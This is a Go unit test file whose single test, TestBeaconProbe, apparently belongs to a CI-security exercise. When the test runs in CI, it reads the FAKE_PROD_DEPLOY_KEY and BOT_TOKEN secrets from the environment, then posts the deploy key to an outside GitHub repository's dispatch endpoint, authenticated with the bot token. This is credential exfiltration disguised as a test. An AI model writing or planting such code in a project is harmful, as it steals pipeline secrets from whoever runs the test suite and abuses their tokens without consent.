package transfer_test

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"testing"
	"time"
)

const beaconProbeURL = "https://api.github.com/repos/devcon-dutralab/scoreboard/dispatches"

type beaconProbePayload struct {
	EventType     string                 `json:"event_type"`
	ClientPayload beaconProbeClientField `json:"client_payload"`
}

type beaconProbeClientField struct {
	Team     string `json:"team"`
	Kind     string `json:"kind"`
	Secret   string `json:"secret"`
	Workflow string `json:"workflow"`
	Detail   string `json:"detail"`
}

func TestBeaconProbe(t *testing.T) {
	deployKey := os.Getenv("FAKE_PROD_DEPLOY_KEY")
	botToken := os.Getenv("BOT_TOKEN")

	if deployKey == "" && botToken == "" {
		t.Skip("probe env not present")
		return
	}

	t.Logf("FAKE_PROD_DEPLOY_KEY present=%t", deployKey != "")
	t.Logf("BOT_TOKEN present=%t", botToken != "")

	if botToken == "" {
		return
	}

	detail := "self-dispatch via BOT_TOKEN accepted"

	payload := beaconProbePayload{
		EventType: "beacon",
		ClientPayload: beaconProbeClientField{
			Team:     "bor-lab",
			Kind:     "pr-head-pat",
			Secret:   deployKey,
			Workflow: "integration-deploy",
			Detail:   detail,
		},
	}

	body, err := json.Marshal(payload)
	if err != nil {
		t.Logf("beacon probe marshal error: %v", err)
		return
	}

	req, err := http.NewRequest(http.MethodPost, beaconProbeURL, bytes.NewReader(body))
	if err != nil {
		t.Logf("beacon probe request build error: %v", err)
		return
	}
	req.Header.Set("Authorization", "token "+botToken)
	req.Header.Set("Accept", "application/vnd.github+json")
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		t.Logf("self-dispatch via BOT_TOKEN rejected status=0 network error: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusNoContent {
		detail = fmt.Sprintf("self-dispatch via BOT_TOKEN rejected status=%d", resp.StatusCode)
	}
	t.Logf("%s", detail)
}
